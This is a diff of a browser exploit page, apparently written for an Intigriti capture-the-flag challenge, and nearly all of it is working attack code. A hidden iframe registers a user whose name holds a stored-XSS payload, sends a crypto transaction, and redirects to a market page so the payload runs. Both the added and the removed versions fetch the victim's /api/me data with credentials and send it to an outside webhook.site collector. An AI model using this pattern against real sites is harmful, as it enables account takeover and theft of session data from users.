@@ -6,7 +6,7 @@
 
 <script>
 const T = 'https://challenge-0126.intigriti.io';
-const W = 'https://webhook.site/b523585f-80b2-41ec-bf1a-6bedadbbf891';
+const W = 'https://webhook.site/2d5b3f64-73f7-45db-a135-ce3e3fb601a3';
 const WALLET = '1f9c3f0d5ebe9960d50b5e030572d264df';
 
 let step = 0;
@@ -16,57 +16,129 @@ function log(msg) {
     const ts = new Date().toISOString();
     document.getElementById('log').innerHTML += '<div>['+step+'] '+msg+' <small>('+ts+')</small></div>';
     console.log('['+step+']', msg);
-    new Image().src = W+'/?s='+step+'&m='+encodeURIComponent(msg)+'&ts='+Date.now();
+    new Image().src = W+'/?step='+step+'&m='+encodeURIComponent(msg);
 }
 
 async function exploit() {
     log('STARTING EXPLOIT');
 
-    // Load checkout in iframe
+    // Create srcdoc iframe (same-origin as parent)
+    // This iframe will execute JS in context of our page
+    // We'll use it to make authenticated requests to challenge API
+    const exploitCode = `
+        <script>
+            const T = '${T}';
+            const W = '${W}';
+            const WALLET = '${WALLET}';
+
+            async function log(msg) {
+                parent.postMessage({type: 'log', msg}, '*');
+                new Image().src = W + '/?iframe=' + encodeURIComponent(msg);
+            }
+
+            async function go() {
+                log('iframe: Starting...');
+
+                // Step 1: Register XSS user
+                const xssUser = 'xss_' + Date.now().toString().slice(-6) + '<img src=x onerror="fetch(\\'' + T + '/api/me\\',{credentials:\\'include\\'}).then(r=>r.json()).then(d=>fetch(\\'' + W + '/?FLAG=\\'+encodeURIComponent(d.flag)+\\',{mode:\\'no-cors\\'}))">';
+
+                log('iframe: Registering XSS user...');
+
+                try {
+                    const reg = await fetch(T + '/api/register', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        credentials: 'include',
+                        body: JSON.stringify({
+                            username: xssUser,
+                            password: 'Test123!@#'
+                        })
+                    });
+
+                    log('iframe: Register status ' + reg.status);
+
+                    if (reg.ok) {
+                        // Step 2: Login as XSS user
+                        log('iframe: Logging in...');
+                        const login = await fetch(T + '/api/login', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            credentials: 'include',
+                            body: JSON.stringify({
+                                username: xssUser,
+                                password: 'Test123!@#'
+                            })
+                        });
+
+                        log('iframe: Login status ' + login.status);
+
+                        if (login.ok) {
+                            // Get our wallet address
+                            const me = await fetch(T + '/api/me', {credentials: 'include'});
+                            const meData = await me.json();
+
+                            const wallet = meData.wallets?.find(w => w.currency === '1337COIN');
+                            if (wallet) {
+                                log('iframe: Our wallet: ' + wallet.address);
+
+                                // Step 3: Send transaction from our XSS user to target wallet
+                                log('iframe: Sending transaction...');
+                                const tx = await fetch(T + '/api/transaction', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    credentials: 'include',
+                                    body: JSON.stringify({
+                                        toAddress: WALLET,
+                                        currency: '1337COIN',
+                                        amount: 1
+                                    })
+                                });
+
+                                log('iframe: TX status ' + tx.status);
+
+                                if (tx.ok) {
+                                    log('iframe: SUCCESS! Transaction created with XSS nickname');
+                                    log('iframe: Redirect to MarketWatch to trigger XSS...');
+                                    setTimeout(() => {
+                                        window.location.href = T + '/marketwatch.html';
+                                    }, 2000);
+                                } else {
+                                    const err = await tx.text();
+                                    log('iframe: TX failed: ' + err);
+                                }
+                            }
+                        } else {
+                            const err = await login.text();
+                            log('iframe: Login failed: ' + err);
+                        }
+                    } else {
+                        const err = await reg.text();
+                        log('iframe: Register failed: ' + err);
+                    }
+                } catch (e) {
+                    log('iframe: Error: ' + e.message);
+                }
+            }
+
+            window.addEventListener('load', go);
+        <\/script>
+        <body>Running exploit in challenge context...</body>
+    `;
+
+    // Create srcdoc iframe
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
-    iframe.src = T + '/checkout.html?currency=1337COIN&price=1';
+    iframe.srcdoc = exploitCode;
     document.body.appendChild(iframe);
 
-    await new Promise(r => iframe.onload = r);
-    await new Promise(r => setTimeout(r, 3000));
-    log('Checkout iframe loaded');
+    log('Exploit iframe created');
 
-    // XSS Payload: Steal flag and exfiltrate to webhook
-    const xssPayload = `<img src=x onerror="
-        fetch('${T}/api/me',{credentials:'include'})
-        .then(r=>r.json())
-        .then(d=>{
-            const flag=d.flag||'NO_FLAG';
-            const user=d.username||'unknown';
-            fetch('${W}/?FLAG='+encodeURIComponent(flag)+'&USER='+encodeURIComponent(user),{mode:'no-cors'});
-            document.body.innerHTML='<h1 style=background:red;color:white;padding:20px>FLAG: '+flag+'</h1>';
-        })
-    ">`;
-
-    log('Sending transaction with XSS payload in nickname...');
-
-    // Send transaction with XSS in nickname field
-    iframe.contentWindow.postMessage({
-        type: 'submitTransaction',
-        transaction: {
-            toAddress: WALLET,
-            currency: '1337COIN',
-            amount: 1,
-            nickname: xssPayload
+    // Listen for log messages from iframe
+    window.addEventListener('message', (e) => {
+        if (e.data && e.data.type === 'log') {
+            log(e.data.msg);
         }
-    }, '*');
-
-    log('postMessage sent');
-
-    await new Promise(r => setTimeout(r, 3000));
-    log('Waiting for admin to view MarketWatch...');
-
-    // Redirect to marketwatch where XSS will execute
-    log('Redirecting to MarketWatch...');
-    setTimeout(() => {
-        window.location.href = T + '/marketwatch.html';
-    }, 3000);
+    });
 }
 
 setTimeout(exploit, 1000);
